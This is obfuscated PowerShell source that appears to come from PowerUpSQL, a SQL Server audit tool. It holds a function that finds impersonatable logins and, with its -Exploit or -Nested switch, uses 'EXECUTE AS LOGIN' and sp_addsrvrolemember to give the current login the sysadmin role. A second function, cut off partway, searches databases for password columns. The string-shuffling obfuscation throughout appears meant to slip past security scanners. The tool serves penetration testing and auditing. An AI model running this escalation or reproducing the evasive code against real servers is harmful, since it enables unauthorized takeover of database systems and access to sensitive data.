}






Function inVOK`E-sqL`Audit`Pri`VIMPe`RSoNAtELo`G`IN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDatoRy = ${f`A`LSe},
                vAlUeFromPIPelInEbypropeRtyNAMe = ${tR`UE},
        heLpMEsSagE = {"{0}{12}{1}{8}{13}{9}{10}{4}{14}{7}{2}{6}{3}{5}{11}"-f 'SQ',' ','t','ate w','co','it','hentic','au','Server ','r doma','in ac','h.','L','o','unt to '})]
        [string]${Use`RNA`mE},

        [Parameter(MANDAtOrY = ${f`ALSe},
                vALueFrOmPiPElInEBYprOPertYNamE = ${tR`UE},
        HelpmEssAGE = {"{10}{8}{6}{9}{4}{0}{2}{11}{5}{12}{7}{1}{3}" -f's','te with','wor','.','nt pas','to au','rver or dom','hentica',' Se','ain accou','SQL','d ','t'})]
        [string]${pA`SSw`O`Rd},

        [Parameter(mandATORY = ${f`AlsE},
        HElpmEsSaGE = {"{3}{2}{0}{1}{4}"-f 'dow','s credenti','in','W','als.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CREdE`Nt`I`Al} =   ( vaRiABLe ('04'+'59'+'m2')  ).VaLUE::"em`Pty",

        [Parameter(mAnDaTOrY = ${Fal`SE},
                ValUEFRomPIPELINeBYpRopeRTyname = ${Tr`UE},
        HElPMeSSAGE = {"{3}{5}{9}{1}{7}{10}{2}{8}{4}{6}{0}"-f 'to.','rve','tanc','S','to connect','QL S','ion ','r in','e ','e','s'})]
        [string]${iNST`A`Nce},

        [Parameter(maNdaTORY = ${F`A`lSe},
        HElPmesSagE = {(("{2}{0}{3}{1}{4}"-f 'onuq0t ','hi','D','output anyt','ng.'))."REpl`Ace"('uq0',[striNG][CHaR]39)})]
        [string]${noOU`T`P`UT},

        [Parameter(manDatORy = ${f`AL`sE},
        HElpMEssAge = {"{4}{2}{5}{1}{3}{0}" -f's.','e issu','vuln','e','Exploit ','erabl'})]
        [switch]${e`Xp`lOIt},
		
		[Parameter(mANDaTORY = ${F`AlsE},
        HELpMESsAge = {"{9}{1}{3}{6}{8}{5}{2}{4}{7}{0}" -f'ilites.','loit','ersonation',' ',' ','p','Nested I','Capab','m','Exp'})]
        [switch]${Ne`stEd}
    )

    Begin
    {
        
        ${T`Bld`ATa} = &("{0}{2}{1}" -f 'New-Obje','t','c') -TypeName ("{6}{5}{1}{3}{0}{2}{4}" -f 'Data','stem.Dat','Tabl','a.','e','y','S')
        ${n`ULl} = ${tB`LD`ATA}."Co`lu`Mns".("{0}{1}" -f 'A','dd').Invoke(("{2}{3}{1}{0}" -f'me','erNa','C','omput'))
        ${nU`Ll} = ${TbL`Da`Ta}."co`LUmNS".("{1}{0}" -f 'dd','A').Invoke(("{0}{1}"-f 'In','stance'))
        ${nu`LL} = ${TB`l`daTa}."cOLu`MnS".("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{3}{1}"-f'V','ility','ulnera','b'))
        ${n`ULL} = ${tB`LD`ATa}."Co`luMNs".("{1}{0}" -f'd','Ad').Invoke(("{0}{3}{1}{2}" -f 'Des','i','on','cript'))
        ${N`ULl} = ${tbL`da`Ta}."COl`U`Mns".("{1}{0}" -f 'dd','A').Invoke(("{0}{3}{1}{2}" -f'Rem','io','n','ediat'))
        ${n`Ull} = ${TBLD`A`Ta}."c`o`lUmnS".("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{0}" -f 'ty','i','Sever'))
        ${Nu`LL} = ${T`B`LdAta}."cOl`U`mNs".("{0}{1}" -f'A','dd').Invoke(("{3}{0}{1}{2}" -f'lnerab','l','e','IsVu'))
        ${N`UlL} = ${T`Blda`TA}."cOLU`Mns".("{0}{1}" -f 'A','dd').Invoke(("{3}{2}{0}{1}{4}" -f 'oit','a','sExpl','I','ble'))
        ${nu`LL} = ${TBL`d`AtA}."COluM`NS".("{1}{0}"-f'dd','A').Invoke(("{1}{2}{0}" -f 'd','Exp','loite'))
        ${N`Ull} = ${T`B`ldatA}."cOl`U`mNS".("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}" -f'Exp','Cmd','loit'))
        ${nu`LL} = ${tb`LDa`TA}."ColUm`NS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}" -f'etails','D'))
        ${Nu`LL} = ${T`BlDA`Ta}."c`OL`UmnS".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}" -f'e','Refer','enc'))
        ${nu`lL} = ${t`B`LdatA}."Co`L`UMNs".("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}" -f 'or','Auth'))
    }

    Process
    {
        
        ${comp`UTerN`A`Me} = &("{4}{0}{1}{3}{2}"-f'NameFromIn','stan','e','c','Get-Computer') -Instance ${IN`STAn`ce}

        
        if(-not ${i`N`sTaNCE})
        {
            ${ins`TanCE} = ${e`N`V:Com`PUteRnaME}
        }

        
        &("{1}{0}{2}"-f 'rite','W','-Verbose') -Message ("$Instance "+': '+'S'+'TART '+'VU'+'LNE'+'R'+'ABILITY '+'CHEC'+'K:'+' '+'PE'+'RMIS'+'SION '+'- '+'IMPER'+'S'+'ONA'+'TE '+'LOG'+'IN')

        
        ${TE`St`c`ONNE`cTION} = &("{2}{1}{3}{0}{4}"-f 's','Co','Get-SQL','nnectionTe','t') -Instance ${i`Nst`AnCE} -Username ${UsE`RNa`Me} -Password ${PAs`sWorD} -Credential ${C`ReD`eNTIAL} -SuppressVerbose | &("{3}{2}{1}{0}" -f'ct','e','e-Obj','Wher') -FilterScript {
            ${_}."s`TAtuS" -eq ("{0}{1}{2}" -f 'Acce','ssi','ble')
        }
        if(-not ${T`E`stconn`eCtI`on})
        {
            
            &("{0}{1}{2}{3}" -f'W','rite-Ve','rb','ose') -Message ("$Instance "+': '+'CONNECT'+'I'+'O'+'N '+'F'+'AI'+'LED.')
            &("{0}{1}{2}{3}"-f 'W','rite-','Verbo','se') -Message ("$Instance "+': '+'COM'+'PLET'+'ED '+'V'+'UL'+'NER'+'ABILITY '+'CHE'+'C'+'K: '+'PER'+'M'+'ISSION '+'- '+'IMPERS'+'ON'+'AT'+'E '+'LOGI'+'N')
            Return
        }
        else
        {
            &("{4}{3}{0}{2}{1}"-f '-V','ose','erb','te','Wri') -Message ("$Instance "+': '+'CONNE'+'C'+'TION'+' '+'SUCC'+'ES'+'S.')
        }

        
        ${SeRv`E`R`iNfO} = &("{1}{0}{2}{3}{4}"-f'-SQ','Get','LSe','rver','Info') -Instance ${iNst`A`NCe} -Username ${us`ErNA`Me} -Password ${pA`s`S`WoRD} -Credential ${Cr`Ed`e`NTiaL} -SuppressVerbose
        ${CURrENt`l`oGin} = ${SErvE`Rin`FO}."cUR`RENTlO`GiN"

        
        
        
        if(${eX`PL`oit})
        {
            ${t`E`STMO`de}  = ("{1}{2}{0}" -f'loit','Ex','p')
        }
        else
        {
            ${TeSTM`o`De}  = ("{1}{0}"-f 'udit','A')
        }
        ${VUlnE`RA`B`Ili`Ty} = ("{0}{7}{8}{1}{9}{4}{5}{3}{11}{6}{10}{2}"-f 'Ex','sive','n','- Im','ile','ge ','onate L','ce','s',' Priv','ogi','pers')
        ${DESCRiP`T`iOn}   = ("{6}{7}{30}{24}{27}{25}{15}{14}{19}{32}{13}{26}{20}{22}{4}{16}{23}{5}{17}{21}{8}{2}{3}{12}{11}{10}{29}{28}{9}{0}{31}{1}{18}" -f' pr','il','ated',' l','ins.','Thi','The cur','rent S','n authentic','al','gain add','in to ','og','onate ','imp',' ',' ','s may a','eges.','er','her l','llow a','og',' ','Server lo','can','ot','gin ','ion','it','QL ','iv','s')
        ${r`eMed`iaTion}   = ("{36}{13}{28}{8}{50}{38}{27}{10}{47}{48}{44}{31}{49}{16}{41}{21}{6}{4}{43}{46}{34}{51}{11}{25}{33}{26}{14}{24}{20}{19}{7}{45}{2}{3}{52}{30}{0}{32}{23}{18}{35}{39}{5}{29}{37}{9}{42}{17}{22}{40}{15}{1}{12}"-f'be','Login::sa to','. ','I',' is enable',':','tion','r','lt','KE','onation s','e: ',' [user]','onsider using an ','ERSONATE ON Login::sa','TE ON ','perso','I','ing a co','use','[','a','MPE','d us',' to ','GRA','MP','rs','a',' REV','can ','rocedu',' remove','NT I','mman','mma','C','O','e','nd like','RSONA','n',' ','d using ','p',']','a co','uch as signed s','tored ','res. Im','erative to imp','d lik','t ')
        ${s`e`VeRiTy}      = ("{1}{0}"-f'h','Hig')
        ${IsvUL`NEr`AB`Le}  = 'No'
        ${isE`xpl`OiT`Able} = 'No'
        ${E`xpL`oited}     = 'No'
        ${ExPLO`I`TcMd}    = ('Invok'+'e-'+'SQLA'+'uditPr'+'ivI'+'m'+'perso'+'nat'+'e'+'Login'+' '+'-Inst'+'anc'+'e '+"$Instance "+'-E'+'xploi'+'t')
        ${dET`A`ILs}       = ''
        ${ref`er`e`Nce}     = ("{8}{4}{1}{9}{7}{0}{2}{6}{3}{5}"-f '/e','sdn.micro','n-u','brary/ms','/m','181362.aspx','s/li','ft.com','https:/','so')
        ${A`UThor}        = (("{4}{7}{2}{6}{5}{0}{1}{3}{8}"-f'in','d), N','la','etSPI 20','Scott Su','d (@_nullb','n','ther','16'))

        
        
        

        
        ${iMpEr`SonAT`iONl`I`St} = &("{4}{3}{2}{1}{0}"-f'riv','P','rver','et-SQLSe','G') -Instance ${i`N`ST`ANCE} -Username ${u`s`e`RNAmE} -Password ${pa`S`swO`Rd} -Credential ${c`RE`dE`NTiAl} -SuppressVerbose | &("{0}{3}{1}{2}" -f 'Wh','bjec','t','ere-O') -FilterScript {
            ${_}."Pe`R`mIsSi`o`NNAMe" -like ("{3}{1}{2}{0}"-f'TE','PERSON','A','IM')
        }

        
        if(${imp`eR`sOnaTioNL`I`St})
        {
            
            &("{0}{1}{2}"-f'Write-Ver','bo','se') -Message ("$Instance "+': '+'- '+'Log'+'ins'+' '+'ca'+'n '+'be'+' '+'imp'+'ersonate'+'d.')
            ${iS`VULnE`R`AblE} = 'Yes'

            
            
            

            
            ${Imp`E`RSOnatI`O`NLISt} |
            &("{1}{4}{3}{2}{0}"-f 'ect','ForEa','j','Ob','ch-') -Process {
                
                ${Im`PERSOn`A`TEDlO`Gin} = ${_}."OBjE`c`T`NAme"
                ${GrANTeEn`A`me} = ${_}."graNT`eEn`Ame"

                
                ${IMPlOG`iNsyS`A`D`m`I`NStaTUS} = &("{1}{0}{2}{3}" -f'et-SQL','G','Qu','ery') -Instance ${iNSta`N`Ce} -Username ${U`S`ERnA`mE} -Password ${P`As`s`WoRd} -Credential ${crEDE`N`Ti`Al} -Query ('SELEC'+'T '+"IS_SRVROLEMEMBER('sysadmin','$ImpersonatedLogin') "+'as'+' '+'Sta'+'tus') -SuppressVerbose | &("{3}{1}{2}{4}{0}"-f 't','e','ct-Obj','Sel','ec') -Property ("{1}{0}{2}" -f'u','Stat','s') -ExpandProperty ("{0}{1}" -f'S','tatus')
                If(${IMp`LOG`I`NsYs`Adm`ins`Tat`Us} -eq 1)
                {
                    
                    &("{3}{1}{2}{0}" -f 'se','t','e-Verbo','Wri') -Message ("$Instance "+': '+'- '+"$GranteeName "+'c'+'an '+'impe'+'rsonate'+' '+'th'+'e '+"$ImpersonatedLogin "+'sy'+'sad'+'min '+'lo'+'gin'+'.')
                    ${iS`eXPl`O`iTaBLE} = 'Yes'
                    ${d`ETaI`ls} = ("$GranteeName "+'c'+'an '+'imp'+'ersona'+'te'+' '+'the'+' '+"$ImpersonatedLogin "+'SYS'+'ADMIN'+' '+'logi'+'n. '+'T'+'his '+'test'+' '+'w'+'as '+'ra'+'n '+'wi'+'th '+'t'+'he '+"$CurrentLogin "+'log'+'in.')

                    
                    
                    
                    if(${eXPl`O`It})
                    {
                        
                        &("{3}{1}{2}{0}"-f 'e','ite-Verbo','s','Wr') -Message ("$Instance "+': '+'- '+'EX'+'PLOITING'+':'+' '+'Start'+'i'+'n'+'g '+'ex'+'ploit '+'proce'+'ss.'+'.'+'.')

                        
                        ${S`YsadMin`pRe`c`HecK} = &("{2}{1}{0}" -f'uery','-SQLQ','Get') -Instance ${i`NSt`ANCe} -Username ${u`sErN`Ame} -Password ${PA`ss`WORD} -Credential ${Cre`dEN`T`IAL} -Query ('SE'+'LECT'+' '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'as'+' '+'Sta'+'t'+'us') -SuppressVerbose | &("{0}{1}{2}{3}"-f 'Sele','ct','-Ob','ject') -Property ("{2}{1}{0}"-f 'us','at','St') -ExpandProperty ("{0}{2}{1}" -f 'St','s','atu')
                        if(${s`Y`S`Ad`miNpRe`Check} -ne 1)
                        {
                            
                            &("{3}{0}{4}{1}{2}" -f 'rite-','b','ose','W','Ver') -Message ("$Instance "+': '+'- '+'EX'+'PLOITI'+'NG: '+'V'+'e'+'rif'+'ied '+'that'+' '+'t'+'he '+'c'+'ur'+'rent '+'u'+'ser '+"($CurrentLogin) "+'is'+' '+'NO'+'T '+'a '+'s'+'ysadm'+'in.')
                            &("{0}{3}{1}{2}"-f 'Write','rb','ose','-Ve') -Message ("$Instance "+': '+'- '+'EX'+'PL'+'OITING: '+'Atte'+'m'+'pting '+'t'+'o '+'a'+'dd '+'th'+'e '+'curr'+'ent'+' '+'u'+'ser '+"($CurrentLogin) "+'t'+'o '+'the'+' '+'sysa'+'dmin'+' '+'role'+' '+'by'+' '+'i'+'mperso'+'nating '+"$ImpersonatedLogin...")

                            
                            ${nU`Ll} = &("{1}{0}{3}{2}" -f 'et','G','QLQuery','-S') -Instance ${In`STA`NCe} -Username ${uS`E`RnaME} -Password ${paS`SWo`Rd} -Credential ${credE`N`T`IaL} -Query ('E'+'XECUTE'+' '+'AS'+' '+'LO'+'GIN'+' '+'= '+"'$ImpersonatedLogin';EXEC "+'s'+'p'+'_a'+'ddsr'+'vrolem'+'ember '+"'$CurrentLogin','sysadmin';Revert") -SuppressVerbose

                            
                            ${S`Y`SAdMinp`oSTcH`Eck} = &("{2}{0}{1}{3}" -f 'Q','LQ','Get-S','uery') -Instance ${I`Nst`AnCe} -Username ${UseR`Na`ME} -Password ${P`AS`SwOrd} -Credential ${cREDeN`T`i`AL} -Query ('SE'+'LECT'+' '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'a'+'s '+'Statu'+'s') -SuppressVerbose | &("{1}{0}{2}" -f 'le','Se','ct-Object') -Property ("{0}{1}"-f'St','atus') -ExpandProperty ("{0}{1}"-f 'S','tatus')
                            if(${s`YsaDM`InPost`Ch`ECk} -eq 1)
                            {
                                &("{0}{1}{2}" -f 'W','rite-V','erbose') -Message ("$Instance "+': '+'- '+'EXPLO'+'ITI'+'NG:'+' '+'It'+' '+'wa'+'s '+'po'+'ssible '+'to'+' '+'make'+' '+'the'+' '+'curren'+'t '+'use'+'r '+"($CurrentLogin) "+'a '+'sysad'+'min!')
                                ${ex`pLOi`TEd} = 'Yes'
                            }
                            else
                            {
                                &("{3}{1}{0}{2}{4}"-f'e','e-V','rbos','Writ','e') -Message ("$Instance "+': '+'- '+'EXPLO'+'ITI'+'NG: '+'I'+'t '+'w'+'as '+'not'+' '+'po'+'ss'+'ible '+'t'+'o '+'mak'+'e '+'th'+'e '+'cu'+'r'+'rent '+'u'+'ser '+"($CurrentLogin) "+'a '+'s'+'ysa'+'dm'+'in.')
                            }
                        }
                        else
                        {
                            
                            &("{2}{1}{0}" -f'ose','te-Verb','Wri') -Message ("$Instance "+': '+'- '+'EX'+'PL'+'OI'+'TING: '+'The'+' '+'cu'+'rrent'+' '+'lo'+'gin '+"($CurrentLogin) "+'i'+'s '+'alre'+'ady '+'a '+'sy'+'sadmin.'+' '+'No'+' '+'privil'+'eg'+'e '+'e'+'scal'+'a'+'tion '+'n'+'ee'+'ded.')
                            ${Exp`loi`TEd} = 'No'
                        }
                    }
					
                    
                    
                    if(${n`e`sTeD})
                    {
                        
                        &("{0}{4}{1}{3}{2}" -f 'Wr','-Ver','e','bos','ite') -Message ("$Instance "+': '+'- '+'EXPL'+'OITIN'+'G'+': '+'Start'+'i'+'ng '+'Nested'+' '+'Imp'+'ersona'+'tion '+'expl'+'oit '+'p'+'rocess '+'(und'+'e'+'r '+'ass'+'ump'+'t'+'ion '+'t'+'o '+'le'+'vels '+'o'+'f '+'n'+'esting '+'a'+'nd '+'1st'+' '+'first'+' '+'c'+'an '+'impe'+'rs'+'onate '+'sa)..'+'.')

                        
                        ${SyS`AdM`i`NpRech`e`Ck} = &("{0}{1}{3}{2}" -f'Get-SQL','Qu','ry','e') -Instance ${iN`Sta`NcE} -Username ${us`ErN`A`Me} -Password ${PAS`S`W`ORd} -Credential ${CRED`E`N`TIAl} -Query ('S'+'EL'+'ECT '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'a'+'s '+'S'+'tatus') -SuppressVerbose | &("{2}{1}{0}" -f'bject','ect-O','Sel') -Property ("{0}{1}{2}"-f'Sta','tu','s') -ExpandProperty ("{0}{2}{1}" -f'Sta','us','t')
                        if(${SY`SA`Dm`iN`P`ReCHEck} -ne 1)
                        {
                            
                            &("{1}{3}{0}{2}"-f 'e','Write-','rbose','V') -Message ("$Instance "+': '+'- '+'EXPLOIT'+'I'+'NG: '+'Verifi'+'e'+'d '+'th'+'at '+'the'+' '+'c'+'urren'+'t '+'u'+'ser '+"($CurrentLogin) "+'i'+'s '+'NOT'+' '+'a '+'sysad'+'m'+'in.')
                            &("{1}{2}{0}" -f 'se','Writ','e-Verbo') -Message ("$Instance "+': '+'- '+'EXP'+'LOI'+'TING'+': '+'A'+'tte'+'mpting'+' '+'to'+' '+'add'+' '+'the'+' '+'cur'+'rent '+'user'+' '+"($CurrentLogin) "+'to'+' '+'t'+'he '+'sys'+'ad'+'min '+'role..'+'.')

                            
                            ${Nu`lL} = &("{0}{1}{2}{3}"-f'Get','-SQL','Qu','ery') -Instance ${iN`StA`NCE} -Username ${u`sE`RNAMe} -Password ${PA`sSwORD} -Credential ${C`RedeN`TiAl} -Query ('EXECUT'+'E '+'A'+'S '+'L'+'O'+'GIN '+'= '+"'$ImpersonatedLogin';EXECUTE "+'A'+'S '+'LOGI'+'N '+'= '+('g'+'xosagxo;EXEC ')."rE`p`lACe"('gxo',[sTrIng][CHAR]39)+'sp_'+'a'+'ddsrvrolememb'+'er '+"'$CurrentLogin','sysadmin'")

                            
                            ${SYsa`dmiNP`Os`Tc`hE`Ck} = &("{2}{0}{1}"-f't-SQL','Query','Ge') -Instance ${iN`s`T`ANCE} -Username ${US`ER`NA`me} -Password ${pa`SSWO`Rd} -Credential ${cRE`dENTI`Al} -Query ('S'+'EL'+'ECT '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'a'+'s '+'Stat'+'u'+'s') -SuppressVerbose | &("{3}{0}{1}{2}" -f '-','O','bject','Select') -Property ("{0}{1}{2}"-f'St','atu','s') -ExpandProperty ("{0}{1}"-f 'S','tatus')
                            if(${sYSadmINP`OS`TC`H`eCk} -eq 1)
                            {
                                &("{2}{3}{1}{4}{0}" -f 'e','-Verbo','W','rite','s') -Message ("$Instance "+': '+'- '+'E'+'XPL'+'OI'+'TING: '+'It'+' '+'wa'+'s '+'possi'+'b'+'le '+'t'+'o '+'m'+'ake '+'t'+'he '+'cur'+'rent'+' '+'user'+' '+"($CurrentLogin) "+'a '+'s'+'ys'+'admin!')
                                ${ex`p`LOi`TED} = 'Yes'
                            }
                            else
                            {
                                &("{0}{2}{1}"-f'Wr','-Verbose','ite') -Message ("$Instance "+': '+'- '+'E'+'XP'+'LOITING: '+'It'+' '+'was'+' '+'not'+' '+'p'+'os'+'sible'+' '+'t'+'o '+'make'+' '+'the'+' '+'c'+'urr'+'ent '+'use'+'r '+"($CurrentLogin) "+'a '+'sysadm'+'in'+'.')
                            }
                        }
                        else
                        {
                            
                            &("{1}{2}{0}" -f'se','Writ','e-Verbo') -Message ("$Instance "+': '+'- '+'EXPLOI'+'T'+'I'+'NG: '+'The'+' '+'cur'+'rent'+' '+'l'+'ogin '+"($CurrentLogin) "+'i'+'s '+'alr'+'e'+'ady '+'a '+'sysad'+'min.'+' '+'N'+'o '+'privi'+'leg'+'e '+'e'+'scalation'+' '+'ne'+'ede'+'d.')
                            ${Ex`PlOiT`ED} = 'No'
                        }
                    }
                }
                else
                {
                    
                    &("{3}{2}{0}{1}"-f 'e-Verb','ose','t','Wri') -Message ("$Instance "+': '+'- '+"$GranteeName "+'c'+'an '+'im'+'pe'+'rsonat'+'e '+'the'+' '+"$ImpersonatedLogin "+'log'+'in '+'(not'+' '+'a '+'s'+'y'+'sadmin)'+'.')
                    ${DEtA`i`Ls} = ("$GranteeName "+'ca'+'n '+'imper'+'son'+'ate '+'t'+'he '+"$ImpersonatedLogin "+'login'+' '+'(not'+' '+'a '+'sy'+'s'+'admin'+'). '+'This'+' '+'tes'+'t '+'wa'+'s '+'r'+'an '+'with'+' '+'th'+'e '+"$CurrentLogin "+'log'+'in.')
                    ${iSe`XPL`oi`Ta`Ble} = 'No'
                }

                
                ${n`ULl} = ${tbL`dA`TA}."r`OWs".("{1}{0}"-f'd','Ad').Invoke(${Co`mpU`T`ERNamE}, ${inS`T`AnCE}, ${VU`lNErA`BI`LI`Ty}, ${d`esC`RIpTIoN}, ${rEmed`ia`TIOn}, ${Se`Veri`TY}, ${ISvuLNe`R`ABLE}, ${iSeXPl`Oi`T`ABlE}, ${Ex`pLOi`T`ED}, ${ex`plO`It`cmD}, ${DE`TA`IlS}, ${reFere`N`CE}, ${aUT`HOr})
            }
        }
        else
        {
            
            &("{0}{3}{2}{1}"-f 'Writ','se','rbo','e-Ve') -Message ("$Instance "+': '+'- '+'No'+' '+'lo'+'gins '+'co'+'uld '+'be'+' '+'im'+'p'+'ersonat'+'ed.')
        }

        
        &("{2}{0}{3}{1}" -f 'it','-Verbose','Wr','e') -Message ("$Instance "+': '+'C'+'OMPLET'+'ED'+' '+'V'+'U'+'LNERABILITY '+'CHECK:'+' '+'PERM'+'I'+'SSION '+'- '+'IMPER'+'SONA'+'TE '+'L'+'OGIN')
    }

    End
    {
        
        if ( -not ${NO`o`Utput})
        {
            Return ${T`Bl`daTa}
        }
    }
}






Function InVOKe-S`QL`AuDitS`AmPLeD`AtAB`yc`o`LumN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAnDAtory = ${f`AlSE},
                ValUefrompIPElInEBYPROPERTYnAMe = ${Tr`Ue},
        HelpMesSAgE = {"{0}{10}{11}{5}{12}{8}{6}{4}{3}{2}{9}{7}{1}"-f 'SQL S','th.','icate','ent','h','mai','nt to aut','wi',' accou',' ','erver ','or do','n'})]
        [string]${USE`RnamE},

        [Parameter(MaNdatoRY = ${FAl`SE},
                VAluefRomPiPeLINeByPRopERTYnAME = ${Tr`UE},
        HElPmeSsagE = {"{15}{3}{12}{11}{9}{14}{7}{0}{10}{8}{1}{16}{6}{13}{2}{5}{4}"-f 'count p','rd t','ntic','QL','te with.','a','aut','c','sswo','r ','a','ve',' Ser','he','or domain a','S','o '})]
        [string]${pAsS`wo`RD},

        [Parameter(MANdATORY = ${Fal`SE},
                VALuEfROMpIpeliNebyProPErtynAMe = ${T`Rue},
        HeLPMESSAGE = {"{1}{6}{5}{3}{0}{2}{4}"-f 'l','Windows','s','a','.','nti',' crede'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cre`den`T`IAl} =  $0459m2::"Emp`TY",

        [Parameter(MANdaTorY = ${f`ALSe},
                vAlUeFrOMPIPeLine = ${t`RuE},
                vALUEfroMpIPElINeBYproPERtyNaME = ${tr`Ue},
        HeLPmesSAGe = {"{1}{2}{7}{3}{4}{0}{6}{5}"-f'stance to conn','SQ','L S','er i','n','n to.','ectio','erv'})]
        [string]${INS`TAN`cE},

        [Parameter(mANDAtoRY = ${Fa`l`sE},
        hElPMesSAGE = {(("{3}{1}{2}{4}{0}" -f'.','n{0','}t output anythin','Do','g'))  -F [chaR]39})]
        [string]${n`o`OUTPuT},

        [Parameter(MAnDAtOry = ${fAl`sE},
        hElPMessaGE = {"{1}{4}{0}{2}{6}{5}{3}" -f 'it vuln','Ex','e','es.','plo','u','rable iss'})]
        [switch]${eX`pl`OIt},

        [Parameter(mANdAtoRy = ${faL`SE},
        HELPMEsSagE = {"{0}{3}{5}{4}{2}{1}"-f 'Numbe','sample.',' ','r of','s to',' record'})]
        [int]${sA`M`PLeSIze} = 1,

        [Parameter(maNDaTory = ${F`A`Lse},
        heLpMeSsAge = {"{4}{3}{0}{2}{1}" -f 'mn name t','arch for.','o se','Colu',' '})]
        [string]${KEywO`RD} = ("{0}{1}" -f 'Pa','ssword')
    )

    Begin
    {
        
        ${t`Blda`TA} = &("{1}{3}{0}{2}" -f'c','New','t','-Obje') -TypeName ("{3}{6}{5}{1}{0}{2}{4}" -f'aT','at','a','System.D','ble','ta.D','a')
        ${Nu`LL} = ${t`BLdatA}."Co`lUm`NS".("{1}{0}" -f'dd','A').Invoke(("{3}{1}{2}{0}" -f'me','uter','Na','Comp'))
        ${N`ULl} = ${TBL`datA}."C`Ol`UMns".("{1}{0}" -f'dd','A').Invoke(("{0}{2}{1}" -f'Ins','ance','t'))
        ${N`Ull} = ${Tb`l`datA}."co`luMNs".("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}{3}" -f 'nerabili','Vul','t','y'))
        ${n`ULL} = ${tB`l`dAta}."c`OluMns".("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{3}{1}"-f 'Des','ion','cri','pt'))
        ${N`UlL} = ${t`B`ldAta}."co`luMns".("{1}{0}" -f'd','Ad').Invoke(("{1}{3}{0}{2}"-f'edi','Re','ation','m'))
        ${Nu`lL} = ${TB`Ldata}."C`Olum`Ns".("{0}{1}"-f'A','dd').Invoke(("{0}{1}{2}"-f'Se','v','erity'))
        ${nU`ll} = ${T`BLda`TA}."C`O`LumNS".("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{1}{0}" -f 'ble','a','IsVulne','r'))
        ${nU`Ll} = ${T`BlD`ATA}."cO`L`UMns".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{3}{2}{4}" -f'sEx','I','loitab','p','le'))
        ${nu`ll} = ${Tb`LdA`TA}."c`oLUmNs".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}{3}"-f'Ex','ploi','te','d'))
        ${nu`LL} = ${t`BL`DATa}."COLU`M`Ns".("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{1}" -f'xplo','itCmd','E'))
        ${nu`lL} = ${tBL`d`Ata}."c`OLUMNs".("{0}{1}"-f'A','dd').Invoke(("{1}{0}" -f'ils','Deta'))
        ${nU`ll} = ${tbL`Da`Ta}."cOLum`NS".("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}"-f'ference','e','R'))
        ${NU`lL} = ${Tb`ld`ATA}."c`oL`UMnS".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}"-f 'A','uthor'))
    }

    Process
    {
        
        ${cOMpu`TERn`AMe} = &("{1}{5}{3}{2}{0}{4}" -f'o','Get','Fr','ComputerName','mInstance','-') -Instance ${i`Nsta`NcE}

        
        if(-not ${In`st`AncE})
        {
            ${i`NsTA`NCe} = ${EnV:`c`oMpUTe`RN`AMe}
        }

        
        &("{0}{4}{1}{3}{2}"-f 'W','Ve','bose','r','rite-') -Message ("$Instance "+': '+'S'+'TART '+'VULN'+'E'+'RABIL'+'ITY '+'CHECK'+': '+'SEARC'+'H '+'DA'+'TA '+'BY'+' '+'C'+'OLU'+'MN')

        
        ${T`esTconNEc`TiON} = &("{2}{4}{1}{0}{3}" -f 'nT','SQLConnectio','Ge','est','t-') -Instance ${in`sTaN`Ce} -Username ${uS`E`RnAme} -Password ${pA`Ss`wORd} -Credential ${cREDE`N`TI`AL} -SuppressVerbose | &("{0}{1}{2}" -f'Where-O','bjec','t') -FilterScript {
            ${_}."StA`TUS" -eq ("{0}{1}{2}" -f'Acc','essibl','e')
        }
        if(-not ${tE`STcO`N`NEcTIoN})
        {
            
            &("{1}{2}{0}" -f'ose','Write-V','erb') -Message ("$Instance "+': '+'CONNECT'+'I'+'ON '+'FA'+'ILED')
            &("{1}{0}{2}"-f 'ite-Verb','Wr','ose') -Message ("$Instance "+': '+'C'+'OMPLETED'+' '+'V'+'ULNERABI'+'LI'+'TY '+'CHECK:'+' '+'SE'+'ARC'+'H '+'DATA'+' '+'BY'+' '+'COL'+'UMN')
            Return
        }
        else
        {
            &("{1}{2}{0}" -f 'ose','Write-','Verb') -Message ("$Instance "+': '+'CONNECT'+'IO'+'N '+'SUCCES'+'S')
        }

        
        
        
        if(${ex`pLO`iT})
        {
            ${Tes`TMODE}  = ("{1}{0}{2}" -f'xplo','E','it')
        }
        else
        {
            ${T`ESTMode}  = ("{1}{0}" -f 'it','Aud')
        }
        ${vUL`N`ErAB`I`lITY} = ("{5}{4}{3}{2}{1}{0}{6}"-f'nsitive Column','y Se','iall','t','n','Pote','s Found')
        ${DeSCr`IPT`ion}   = ("{24}{0}{17}{21}{18}{5}{10}{14}{19}{1}{6}{11}{12}{2}{8}{7}{15}{3}{22}{16}{23}{20}{13}{4}{9}"-f'lumn','ul','ba','nta','formati','e fou','t ','s that may','se','on.','nd','dat','a',' in',' in non',' co','se','s','wer',' defa','e',' ','in ','nsitiv','Co')
        ${r`EMedIa`T`ion}   = ("{5}{12}{0}{11}{8}{18}{6}{3}{2}{20}{14}{4}{10}{21}{7}{22}{9}{15}{1}{17}{13}{16}{19}" -f'at all pass',', or','ve dat','ensti','re mask','Ensu','s',' has','d','e','e','words an','re th','en',' a','d','crypte',' ',' ','d.','a','d,','h')
        ${SeVeRi`Ty}      = ("{1}{3}{2}{0}"-f'al','In','n','formatio')
        ${isV`ULNeRab`le}  = 'No'
